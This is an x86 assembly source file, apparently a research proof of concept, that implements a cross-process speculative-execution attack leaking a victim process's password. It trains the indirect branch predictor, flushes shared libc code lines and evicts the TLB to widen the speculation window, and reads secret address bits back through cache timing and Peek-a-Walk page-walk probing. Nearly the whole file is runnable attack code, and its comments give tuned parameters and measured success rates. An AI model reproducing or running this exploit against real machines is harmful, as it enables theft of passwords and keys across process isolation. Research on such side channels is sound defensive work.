%include "../../nops.inc"

%define nthreads 1
%define repeat2  1               ; Repeat count for repeat macro around testcode. Default = 100
%define noptype  1

; No victim cooperation: the attacker takes itself off the core with nanosleep
; (ATTACKER_HANDOFF) and never waits on a shared token. The victim is a
; separate, long-lived process that knows nothing about us.

; Total measurement rounds, however they are distributed between the two loops.
%ifndef num_rounds
%define num_rounds 1000
%endif

; Per-round measurement: each round lands in its own CustomClockResults slot so
; the run prints a distribution -- the only way to see a leak that lands in a
; minority of rounds.
%define repeat0 num_rounds
%define repeat1 1

; Number of training calls per round. These install E1 (the IBP entry for
; strlen@plt / gadget_plt) pointing at pkey_fake_import, which is what makes the
; victim's stalled strlen@plt speculate into the secret-carrying gadget. They
; are load-bearing and cannot be removed -- but each one also resolves
; gadget's `call [rax]` to dummy_target_0, overwriting E2, so the count trades
; off E1 training strength against how much of the round is hostile to E2.
%ifndef train_count
%define train_count 100
%endif

; Nanoseconds the attacker blocks in ATTACKER_HANDOFF when use_spinlocks=0.
; Must be < 1e9 (it is a tv_nsec) and is stored with a 32-bit immediate.
;
; The hit rate is strongly peaked in this value -- measured 0.3% at 2ms, 4.9% at
; 8ms, 55.6% at 12ms, 84.8% at 16ms, 92.8% at 24ms, 86.9% at 32ms. The default
; sits at the peak, which is roughly one whole victim round: long enough to be
; sure of spanning a gadget call, before E2 starts aging out under the victim's
; own PBKDF2 branches.
%ifndef sleep_ns
%define sleep_ns 24000000
%endif

; --- Attacker-side TLB flush of the victim's strlen@GOT page -----------------
;
; got_flush_slices > 1 subdivides ATTACKER_HANDOFF into N sleeps and evicts the
; dTLB before each one, instead of sleeping sleep_ns in a single block.
;
; Why this works, and why the alternatives do not:
;   * The stall that opens the speculation window comes from evicting the GOT
;     page's TLB entry (measured: got_stall=2 beats got_stall=1 and matches
;     clflush). It is NOT an L1D effect.
;   * The attacker cannot clflush the slot: .got is inside GNU_RELRO, written by
;     ld.so at startup, so it is a private COW page -- a different physical line
;     from the attacker's own GOT.
;   * A flusher on the SMT sibling cannot do it either: measured on the isolated
;     pair, an aggressor thrashing 2048 pages on cpu5 moves a victim on cpu4 by
;     +2.5% over a cache/port control. The dTLB is not shared across siblings.
;   * But victim and attacker share ONE core, hence one dTLB. The attacker just
;     has to be running to use it -- and at use_spinlocks=0 it is asleep for the
;     whole 24 ms the victim runs. Subdividing the sleep fixes exactly that.
;
; Budget: the victim makes ~7.6 strlen calls per 24 ms window at
; pbkdf2_iters=10000. 240 slices gives ~240 evictions against those 7.6 calls,
; so essentially every call takes a page walk. Cost is ~5% of the window in
; wakeups.
; 24 is the shipped value and is NOT a knob. It is the setting the one
; no-clflush loop-1 measurement used (got_stall=0, 120 trials: PL2 line 18 at
; sum 462, gap 232, rank 1 of 64, z=8.7). The 240-slice budget argued for just
; above is the first thing to try if loop 1 comes in thin, but 24 is what was
; actually measured. 1 restores the old single-sleep handoff, which has no
; window at all at got_stall=0.
%ifndef got_flush_slices
%define got_flush_slices 24
%endif
%ifndef got_flush_pages
%define got_flush_pages 64                ; pages per eviction pass (unrolled)
%endif

; ---------------------------------------------------------------------------
; Peek-a-Walk (get_higher_bits=1) throughput knobs.
;
; Cost is brutal here and it is entirely victim latency. One profile_cache call
; is pwsc_trials x 64 cache lines x 10 rounds x 2 phases setup/trigger pairs,
; and EVERY pair blocks for a victim gadget call. Measured against the shipped
; victim (pbkdf2_iters=10000, ~3.2 ms per PKCS5_PBKDF2_HMAC): 16 rows/s, i.e.
; ~1.3 h per profile_cache, ~4 h per find_level0_line (3 attempts), and
; leak_inst_addr_ind needs at least two of those. This is the same order with
; or without spinlocks -- the PBKDF2 latency dominates either way, so dropping
; the spinlock costs nothing in runtime.
;
; trials/threshold are a matched pair: the solver sums per-line timings across
; trials and needs the winning line to clear the runner-up by the threshold, so
; the gap scales with the trial count. pwsc.h ships the two calibrated pairings
; as NUM_TRIALS_USUAL/THRESHOLD_USUAL (128/55) and NUM_TRIALS_FAST/THRESHOLD_FAST
; (16/4); 120/25 is what this attack was tuned with. Change them together.
%ifndef pwsc_trials
%define pwsc_trials 120
%endif
%ifndef pwsc_threshold
%define pwsc_threshold 25
%endif

; BOTH phases block for the victim. The k=0 (noise) and k=1 (signal) phases run
; identically from here on: the victim thrashes the page-walk caches while it
; runs, so paying the same cost in both keeps that disturbance common-mode and
; lets it cancel in (signal - noise).
;
; Skipping the block in the noise phase would be exactly 2x faster and is sound
; in principle -- the noise phase does no training, so the victim cannot write
; the secret into E2 however long it runs, and the sleep is pure cost. It was
; never adopted because it removes the victim's cache disturbance from the noise
; baseline ONLY, which biases every line's (signal - noise) by the victim's own
; page-walk footprint. That bias is silent: it shifts the decode rather than
; breaking it. No run has ever used it.
; ---------------------------------------------------------------------------

; Attacker-side handoff. Unlike the victim these need no size padding: every
; address that has to match the victim lives in its own section pinned by
; attacker.ld, so nothing here moves them.

; Block for sleep_ns nanoseconds. This is the no-cooperation replacement for the
; spinlock: what makes the spinlock work is not that it is a lock, but that it
; takes the attacker OFF the runqueue until the victim has run. nanosleep does
; the same thing unilaterally -- the victim is then the only runnable task
; pinned to this core, so it gets the whole interval, and it never has to
; participate.
;
; The timespec lives at UserData+256 (tv_sec) / UserData+264 (tv_nsec), written
; by testinitc. UserData is 0x800000 zeroed bytes and offsets 0, 64, 128 and 512
; are the only ones already spoken for (SET_PHR, start_collision,
; dummy_target_0), so +256 is free.
%macro ATTACKER_SLEEP 0
    mov eax, 35                       ; __NR_nanosleep
    lea rdi, [rel UserData+256]       ; struct timespec *req
    xor esi, esi                      ; rem = NULL; an EINTR just means we
                                      ; resume early, which is harmless here
    syscall                           ; clobbers rax, rcx, r11
%endmacro

; Touch got_flush_pages distinct pages, one line each, to evict the dTLB by
; capacity. Attacker's own memory; needs no address of the victim's. r10 is
; free here (r11/rcx are syscall-clobbered, rax/rbx/rdi are in use around the
; handoff), and this runs entirely outside any measured region.
%macro TLB_EVICT 0
    ; Straight-line, NO branches: a loop here would push taken branches into the
    ; PHR that start_collision depends on. Unrolled, so got_flush_pages x
    ; got_flush_slices is the instruction budget -- keep the product modest.
    ; rax/r10 are saved rather than assumed dead; this is outside every measured
    ; region so the stack traffic costs nothing.
    push rax
    push r10
    lea r10, [rel tlb_evict_buf]
    %assign tlb_i 0
    %rep got_flush_pages
      mov al, [r10 + tlb_i * 4096]
      %assign tlb_i tlb_i + 1
    %endrep
    pop r10
    pop rax
%endmacro

; One handoff: either the shipped single sleep, or N x (evict, short sleep).
%macro ATTACKER_HANDOFF_SLEEP 0
  %if got_flush_slices <= 1
    ATTACKER_SLEEP
  %else
    %rep got_flush_slices
      TLB_EVICT
      ATTACKER_SLEEP
    %endrep
  %endif
%endmacro

; Give the victim the core and do not come back until it has had a real chance
; to run. The fences keep the training above ordered ahead of the handoff.
;
; This is the one site that decides whether the attack works: the victim's write
; to E2 must land after our last training call and before our measuring call,
; and this nanosleep is that gap -- a fixed interval long enough to span at
; least one victim gadget call, relying on sampling many rounds to catch the
; good phases.
%macro ATTACKER_HANDOFF 0
    SERIALIZE
    mfence
    ATTACKER_HANDOFF_SLEEP
%endmacro

; End of round: only the fences remain (no token in the no-cooperation handoff).
%macro ATTACKER_RELEASE 0
    SERIALIZE
    mfence
%endmacro

%macro testinit1 0
  %rep get_higher_bits
    push rdi ; Save all registers we will mangle
    push rsi
    push rdx
    push rcx
    push r8
    push r9
    sub rsp, 8

    ; The template runs testinit1 BEFORE the first testinitc (TEST_LOOP_2), so
    ; everything setup_trigger depends on has to be established here too --
    ; testinitc is far too late to help Peek-a-Walk. Duplicated rather than
    ; hoisted because testinitc still has to re-do it for the testcode path,
    ; which runs get_higher_bits=0 builds where testinit1 is empty.
    ;
    ; 1. Resolve strlen. FLUSH_VICTIM_STRLEN dereferences this GOT slot to reach
    ;    the shared libc code page; left unresolved it still points at the PLT
    ;    resolver stub, so the flush lands on the wrong lines entirely.
    mov rdi, SecretString
    call strlen

    ; 2. ATTACKER_SLEEP's timespec. UserData is zeroed, so without this every
    ;    use_spinlocks=0 handoff inside setup_trigger asks nanosleep for 0 ns
    ;    and returns immediately: the victim never gets the core, never reaches
    ;    the stalled strlen@plt, and E2 never receives the secret. Peek-a-Walk
    ;    then measures nothing but noise in both phases.
    mov qword [rel UserData+256], 0           ; tv_sec
    mov qword [rel UserData+264], sleep_ns / got_flush_slices  ; tv_nsec

    call evict_dsb

    lea rdi, [rel setup_trigger]
    xor rsi, rsi
    lea rdx, [rel trigger]
    lea rcx, [rel MEMORY_MAP_ORDER_ORACLE_EVICT_SIZES]
    mov r8, pwsc_threshold  ; sum threshold for the Peek-a-Walk solver
    mov r9, pwsc_trials     ; trials per profile_cache call

    call pwsc_init_reset

    mov rdi, secret_value
    lea rsi, [rel init_noise_filter]
    xor rdx, rdx
    lea rcx, [rel setup_trigger]
    lea r8, [rel trigger]

    call leak_inst_addr_ind


    %rep 512
      nop
    %endrep

    add rsp, 8

    pop r9 ; Save all registers we will mangle
    pop r8
    pop rcx
    pop rdx
    pop rsi
    pop rdi

  %endrep
%endmacro

%macro testinitc 0              ; Macro to call in each test before reading counters.
    mov dword[PrintCustomPMC], 1

    lea rax, [UserData]
    mov [UserDataPtr], rax

    lea rax, [UserDataPtr]
    mov [UserDataPtrPtr], rax

    lea rax, [UserDataPtrPtr]
    mov [UserDataPtrPtrPtr], rax

    ; Resolve strlen in this process too. We never speculate through our own
    ; strlen@plt, but FLUSH_VICTIM_STRLEN below dereferences this GOT slot to
    ; reach the libc code page, which is physically shared with the victim.
    mov rdi, SecretString
    call strlen

    ; timespec for ATTACKER_SLEEP. Written here rather than assembled as data so
    ; it needs no section of its own in attacker.ld.
    mov qword [rel UserData+256], 0           ; tv_sec
    mov qword [rel UserData+264], sleep_ns / got_flush_slices  ; tv_nsec (< 1e9)
%endmacro

%macro testcode 0               ; A multi-line macro executing any piece of test code.
    SERIALIZE_OPT

    ; Train E1 (gadget_plt -> gadget, i.e. strlen@plt -> pkey_fake_import) so the
    ; victim's stalled strlen@plt speculates into the secret-carrying gadget.
    ; Necessary; also the reason E2 is hostile territory for most of the round.
    %rep train_count
      call start_collision
    %endrep

    SERIALIZE_OPT

    FLUSH_VICTIM_STRLEN

    SERIALIZE_OPT

    ; Hand the turn to the writer so it can write the IBP. The strlen code lines
    ; flushed just above stay flushed across the handoff, which is what stalls
    ; the victim's strlen@plt.
    ATTACKER_HANDOFF

    ; .sec_malicious_target is linked at the CANDIDATE SECRET ADDRESS, which can
    ; sit more than 2 GiB from .text -- 0xdeadbeef is 3.46 GiB out, and .text
    ; cannot follow it because .sec_gadget/.sec_gadget_plt are pinned to the
    ; victim's OpenSSL addresses. RIP-relative operands are R_X86_64_PC32 and
    ; truncate at link time, so both addresses are materialised as 64-bit
    ; absolutes and referenced indirectly. Reloaded after start_collision
    ; because the collision path does not preserve r8/r14.
    ; Only r8 is safe here: READ_PMC_START uses r13, and READ_PMC_END uses r13
    ; AND r14 as the counter index (`add %eax,0x1fc(%r13,%r14,4)`), so parking
    ; an address in r14 segfaults. r8 is touched by neither. The clflushes are
    ; outside the timed region, so one register can serve both addresses.
    mov r8, strict qword malicious_target_0
    clflush [r8]
    mov r8, strict qword align_target
    clflush [r8]

    SERIALIZE_OPT

    ; Readback: direct `call gadget` (chosen config, paired with victim_calls=5).
    ; Restore rdi (handoff nanosleep clobbered it) -> UserData+128 = dummy_target_0
    ; (gadget's architectural target; the speculative target comes from E2).
    mov qword [rel UserData+128], dummy_target_0
    lea rdi, [rel UserData+128]
    call gadget

    SERIALIZE_OPT

    %if leak_final_6
      mov r8, strict qword align_target
    %else
      mov r8, strict qword malicious_target_0
    %endif

    READ_PMC_START
      mov r9, [r8]
    READ_PMC_END

    ATTACKER_RELEASE

   %rep 512
     nop
    %endrep

%endmacro

; libc is mapped from the same physical pages in both processes, so evicting
; the strlen code lines here also evicts them for the victim. That keeps the
; victim's stalled strlen@plt from resolving early and widens the speculation
; window in which pkey_fake_import writes the secret into the IBP. The victim
; flushes its own (private) GOT slot; this flushes the (shared) code.
%macro FLUSH_VICTIM_STRLEN 0
    mov rax, [rel strlen wrt ..got]
    clflush [rax]
    clflush [rax + 64]
    clflush [rax + 128]
%endmacro

%macro SERIALIZE_OPT 0
    mfence
    xor eax, eax
    cpuid
%endmacro

section .sec_collision exec
start_collision:
    ; BTB steering: no PHR.  The BTB is indexed by PC[23:0] only, and gadget_plt
    ; is pinned by attacker.ld at the victim's strlen@plt address, so calling it
    ; directly seats BTB[strlen@plt] -> gadget with the right alias -- no branch
    ; history to reproduce, so the whole fake_crypto_*/fake_obj PHR-replay chain
    ; is gone and we call gadget_plt straight.
    SERIALIZE_OPT

collision_ibranch_pc:
    %rep 16
      nop
    %endrep
    mov qword [rel UserData+64], gadget          ; gadget_plt's indirect target
    mov qword [rel UserData+128], dummy_target_0 ; what gadget's `call [rax]` takes
    lea rdi, [rel UserData+128]
    call gadget_plt
    %rep 512
      nop
    %endrep
    ret

; Mirrors strlen@plt @ 0x4031a0 in the victim: `jmp *strlen@GOT(%rip)`.
; This is the branch the victim stalls; training it here points its IBP entry
; at gadget (= pkey_fake_import in the victim).
section .sec_gadget_plt exec
gadget_plt:
    jmp [UserData+64]
    %rep 512
      nop
    %endrep
    ret

%rep 512
  nop
%endrep

; Mirrors pkey_fake_import @ 0x4358e0 in the victim:
;   4358e0: push %rax            (1B)   -> nop here, we do not need the slot
;   4358e1: mov  %rdi,%rax       (3B)
;   4358e4: mov  0x8(%rdi),%rsi  (4B)
;   4358e8: mov  %rdx,%rdi       (3B)
;   4358eb: call *(%rax)                <-- the secret-carrying indirect branch
; In the victim this executes speculatively with rax = rdi = password, so the
; IBP entry for 0x4358eb is written with *password, i.e. the secret. Here we
; read that entry back: architecturally we go to dummy_target_0, speculatively
; to the secret address.
section .sec_gadget exec
gadget:
    nop
    mov rax, rdi
    mov rsi, [rdi+8]
    mov rdx, rdi
    call [rax]
    %rep 512
      nop
    %endrep
   ret

%rep 512
  nop
%endrep

section .sec_dummy_target_0 exec
dummy_target_0:
mov r9, [UserData+512]
%rep 100
  nop
%endrep
ret

%rep 512
  nop
%endrep

; Linked at the candidate secret address. num_align nops place the `jmp
; align_target` at exactly one of the 64 offsets in the line, so the sweep over
; num_align resolves the bottom 6 bits: only when num_align matches the low
; bits of the secret does the speculative fetch land on the jump and pull
; align_target into the cache.
section .sec_malicious_target exec
malicious_target_0:
    %rep num_align
      nop
    %endrep
    jmp align_target
    %rep 512
      nop
    %endrep
    ret

%rep 512
  nop
%endrep


section .align_target exec
align_target:
  %rep 512
    nop
  %endrep
  ret

section .sec_setup_trigger exec
setup_trigger:
    push rbx                 ; rbx is callee-saved (SysV ABI) and this is
                              ; called as a C function pointer from pwsc.c,
                              ; which keeps order_oracle live in rbx across
                              ; the call -- must not clobber it here
    ; rsi is the phase: 0 = noise, 1 = signal. Only the signal phase trains E1,
    ; and E1 is what makes the victim speculate into the secret-carrying gadget
    ; -- so the noise phase leaves E2 holding the attacker's own dummy_target_0.
    ; That asymmetry IS the channel; everything downstream is common-mode.
    test rsi, rsi
    jz .skip_training
  %rep train_count
    call start_collision
  %endrep
  .skip_training

  SERIALIZE_OPT

  ; Call the victim here

    ; Same widening flush as testcode: the victim's stalled strlen@plt is what
    ; opens the speculation window, and the libc code lines are shared, so they
    ; have to be cold on this side too before we hand the turn over.
    FLUSH_VICTIM_STRLEN

    ; Unconditional: the noise phase pays the same handoff as the signal phase
    ; so the victim's cache disturbance is common-mode. See the note at the top.
    ATTACKER_HANDOFF


  SERIALIZE_OPT

  %rep 512
    nop
  %endrep

    pop rbx
    ret


section .sec_trigger exec
trigger:
    push rbx                 ; rbx is callee-saved (SysV ABI). start_collision's
                             ; SERIALIZE_OPT runs `cpuid`, which clobbers ebx
                             ; with the CPUID vendor string ("Genu"). trigger is
                             ; called as a C function pointer from pwsc.c, which
                             ; holds order_oracle live in rbx across the call, so
                             ; it must be preserved (setup_trigger does the same).
                             ; One push also keeps rsp 16-aligned at the call.
  mfence
  clflush [dummy_target_0]
  clflush [gadget_plt]       ; was fake_crypto_1 (PHR chain, removed); flush the
                             ; BTB-steer entry point so the collision re-trains cold
                             ; Fires the measured collision branch in BOTH phases
                             ; so its architectural footprint cancels in
                             ; (signal - noise). The noise/signal difference is
                             ; created upstream in setup_trigger by TRAINING ORDER
                             ; (who wins the IBP entry: benign dummy vs secret),
                             ; so only the speculative walk differs here.
  ; Readback: direct `call gadget` (restore rdi, clobbered upstream, ->
  ; UserData+128 = dummy_target_0 architectural target; speculative target = E2).
  mov qword [rel UserData+128], dummy_target_0
  lea rdi, [rel UserData+128]
  call gadget
    pop rbx
  ret

section .bss
align 4096
tlb_evict_buf: resb (got_flush_pages + 1) * 4096
